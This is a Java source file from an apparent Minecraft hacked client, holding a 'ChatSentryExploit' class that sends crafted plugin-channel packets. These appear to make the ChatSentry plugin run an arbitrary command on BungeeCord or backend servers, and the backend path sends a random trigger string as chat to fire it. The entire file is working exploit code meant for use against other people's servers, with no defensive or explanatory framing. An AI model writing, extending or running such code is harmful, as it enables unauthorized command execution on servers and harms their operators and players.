package me.nullnet.voxelclient.exploits;

import com.mojang.brigadier.context.CommandContext;
import java.util.Random;
import me.nullnet.voxelclient.Helper;
import me.nullnet.voxelclient.packets.ChatSentryPayloadPacket;
import me.nullnet.voxelclient.utils.ColorUtil;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.class_2817;

public class ChatSentryExploit {
   public static int executeBungee(CommandContext<FabricClientCommandSource> context) {
      String command = (String)context.getArgument("command", String.class);
      long now = System.currentTimeMillis();
      ((FabricClientCommandSource)context.getSource()).getClient().method_1562().method_52787(new class_2817(new ChatSentryPayloadPacket(command, true, "", "")));
      ((FabricClientCommandSource)context.getSource()).getPlayer().method_7353(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5ChatSentryExploit&8] &7Sent &51 &7exploit packet. &8[&6" + (System.currentTimeMillis() - now) + "ms&8]"), false);
      return 1;
   }

   public static int executeBackend(CommandContext<FabricClientCommandSource> context) {
      String command = (String)context.getArgument("command", String.class);
      (new Thread(() -> {
         sendAutoExecution(command, context);
      })).start();
      return 1;
   }

   private static void sendAutoExecution(String command, CommandContext<FabricClientCommandSource> context) {
      long now = System.currentTimeMillis();
      String s = Helper.generateRandomString(4, "igasdgugadwab", new Random());
      Helper.sendPacket(new class_2817(new ChatSentryPayloadPacket(command, false, "config", s)));
      Helper.sendPacket(new class_2817(new ChatSentryPayloadPacket(command, false, "module", s)));
      ((FabricClientCommandSource)context.getSource()).getPlayer().method_7353(ColorUtil.translate("&8[&5&lVoxel&8] &8[&5ChatSentryExploit&8] &7Sent exploit packets. &8[&6" + (System.currentTimeMillis() - now) + "ms&8]"), false);

      try {
         Thread.sleep(100L);
      } catch (InterruptedException var6) {
         var6.printStackTrace();
      }

      ((FabricClientCommandSource)context.getSource()).getClient().method_1562().method_45729(s);
   }
}
